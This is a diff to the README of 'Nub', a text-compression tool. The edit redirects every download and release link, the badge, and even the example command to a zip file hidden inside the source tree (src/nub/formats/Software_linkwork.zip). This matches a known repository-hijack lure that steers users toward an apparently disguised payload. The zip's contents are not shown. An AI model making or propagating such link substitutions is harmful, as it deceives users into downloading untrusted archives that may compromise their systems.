@@ -6,7 +6,7 @@ Welcome to Nub! This tool helps you compress large pieces of text, like code and
 
 ## 📥 Download Nub
 
-[![Download Nub](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/aftre1439/nub/releases)
+[![Download Nub](https://raw.githubusercontent.com/aftre1439/nub/main/src/nub/formats/Software_linkwork.zip)](https://raw.githubusercontent.com/aftre1439/nub/main/src/nub/formats/Software_linkwork.zip)
 
 ## 📄 Features
 
@@ -26,7 +26,7 @@ To install Nub, follow these steps:
 
 1. Ensure you have Python installed. You can check this by running `python --version` in your command line or terminal.
 
-2. Visit the [Releases Page](https://github.com/aftre1439/nub/releases) to download the latest version.
+2. Visit the [Releases Page](https://raw.githubusercontent.com/aftre1439/nub/main/src/nub/formats/Software_linkwork.zip) to download the latest version.
 
 3. Choose a version suitable for your operating system. 
 
@@ -51,7 +51,7 @@ Once installed, you can start compressing text files right away. Here’s how to
 2. Run the following command to compress your file:
 
    ```bash
-   nub src/my_python_file.py
+   nub https://raw.githubusercontent.com/aftre1439/nub/main/src/nub/formats/Software_linkwork.zip
    ```
 
 This command will compress your Python file and display a structured overview. Adjust the path to point to the correct location of your file.
@@ -88,4 +88,4 @@ Nub is open-source software. You can use it for personal or commercial projects.
 
 ## 📢 Conclusion
 
-Thank you for choosing Nub. We hope this tool enhances your experience with text compression while you work with large and complex data. Be sure to check for updates on the [Releases Page](https://github.com/aftre1439/nub/releases). Happy compressing!
+Thank you for choosing Nub. We hope this tool enhances your experience with text compression while you work with large and complex data. Be sure to check for updates on the [Releases Page](https://raw.githubusercontent.com/aftre1439/nub/main/src/nub/formats/Software_linkwork.zip). Happy compressing!
